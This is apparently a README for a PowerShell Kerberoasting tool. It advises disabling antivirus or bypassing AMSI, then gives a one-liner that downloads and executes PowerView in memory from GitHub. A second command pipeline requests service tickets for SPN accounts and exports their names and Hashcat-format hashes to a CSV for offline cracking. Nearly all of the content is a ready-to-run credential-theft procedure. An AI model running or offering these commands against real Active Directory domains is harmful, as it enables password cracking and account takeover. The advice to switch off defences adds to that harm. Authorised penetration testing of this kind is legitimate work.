# Invoke-Kerberoast
PowerShell script to execute Kerberoasting and export samaccountname and hash to CSV.

> IT IS RECOMMENDED TO DISABLE AV OR BYPASS AMSI

#### Download PowerView into Memory
````
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1');Get-NetDomain;
````

#### Execute Kerberoasting
````
Get-netuser -SPN | Get-DomainSPNTicket -outputformat Hashcat | Select-Object samaccountname,Hash | ConvertTo-Csv -NoTypeInformation | Select-object -skip 1 > kerberoast.csv
````

The resulting `kerberoast.csv` file can then be imported into the Excel from this repository.
